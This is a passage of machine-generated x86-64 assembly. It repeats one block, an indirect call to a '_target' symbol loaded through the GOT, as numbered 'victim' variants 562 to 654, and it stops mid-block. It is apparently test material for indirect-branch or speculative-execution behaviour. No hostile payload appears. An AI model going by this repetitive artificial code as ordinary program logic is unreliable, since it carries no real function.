	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 562
.Lvictim_win0_var562:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 563
.Lvictim_win0_var563:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 564
.Lvictim_win0_var564:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 565
.Lvictim_win0_var565:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 566
.Lvictim_win0_var566:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 567
.Lvictim_win0_var567:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 568
.Lvictim_win0_var568:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 569
.Lvictim_win0_var569:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 570
.Lvictim_win0_var570:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 571
.Lvictim_win0_var571:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 572
.Lvictim_win0_var572:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 573
.Lvictim_win0_var573:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 574
.Lvictim_win0_var574:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 575
.Lvictim_win0_var575:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 576
.Lvictim_win0_var576:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 577
.Lvictim_win0_var577:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 578
.Lvictim_win0_var578:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 579
.Lvictim_win0_var579:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 580
.Lvictim_win0_var580:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 581
.Lvictim_win0_var581:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 582
.Lvictim_win0_var582:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 583
.Lvictim_win0_var583:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 584
.Lvictim_win0_var584:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 585
.Lvictim_win0_var585:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 586
.Lvictim_win0_var586:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 587
.Lvictim_win0_var587:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 588
.Lvictim_win0_var588:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 589
.Lvictim_win0_var589:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 590
.Lvictim_win0_var590:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 591
.Lvictim_win0_var591:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 592
.Lvictim_win0_var592:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 593
.Lvictim_win0_var593:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 594
.Lvictim_win0_var594:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 595
.Lvictim_win0_var595:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 596
.Lvictim_win0_var596:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 597
.Lvictim_win0_var597:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 598
.Lvictim_win0_var598:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 599
.Lvictim_win0_var599:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 600
.Lvictim_win0_var600:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 601
.Lvictim_win0_var601:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 602
.Lvictim_win0_var602:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 603
.Lvictim_win0_var603:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 604
.Lvictim_win0_var604:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 605
.Lvictim_win0_var605:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 606
.Lvictim_win0_var606:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 607
.Lvictim_win0_var607:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 608
.Lvictim_win0_var608:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 609
.Lvictim_win0_var609:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 610
.Lvictim_win0_var610:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 611
.Lvictim_win0_var611:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 612
.Lvictim_win0_var612:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 613
.Lvictim_win0_var613:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 614
.Lvictim_win0_var614:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 615
.Lvictim_win0_var615:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 616
.Lvictim_win0_var616:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 617
.Lvictim_win0_var617:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 618
.Lvictim_win0_var618:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 619
.Lvictim_win0_var619:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 620
.Lvictim_win0_var620:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 621
.Lvictim_win0_var621:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 622
.Lvictim_win0_var622:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 623
.Lvictim_win0_var623:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 624
.Lvictim_win0_var624:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 625
.Lvictim_win0_var625:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 626
.Lvictim_win0_var626:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 627
.Lvictim_win0_var627:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 628
.Lvictim_win0_var628:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 629
.Lvictim_win0_var629:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 630
.Lvictim_win0_var630:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 631
.Lvictim_win0_var631:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 632
.Lvictim_win0_var632:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 633
.Lvictim_win0_var633:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 634
.Lvictim_win0_var634:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 635
.Lvictim_win0_var635:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 636
.Lvictim_win0_var636:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 637
.Lvictim_win0_var637:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 638
.Lvictim_win0_var638:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 639
.Lvictim_win0_var639:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 640
.Lvictim_win0_var640:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 641
.Lvictim_win0_var641:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 642
.Lvictim_win0_var642:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 643
.Lvictim_win0_var643:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 644
.Lvictim_win0_var644:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 645
.Lvictim_win0_var645:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 646
.Lvictim_win0_var646:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 647
.Lvictim_win0_var647:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 648
.Lvictim_win0_var648:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 649
.Lvictim_win0_var649:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 650
.Lvictim_win0_var650:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 651
.Lvictim_win0_var651:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 652
.Lvictim_win0_var652:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 653
.Lvictim_win0_var653:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 654
.Lvictim_win0_var654:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
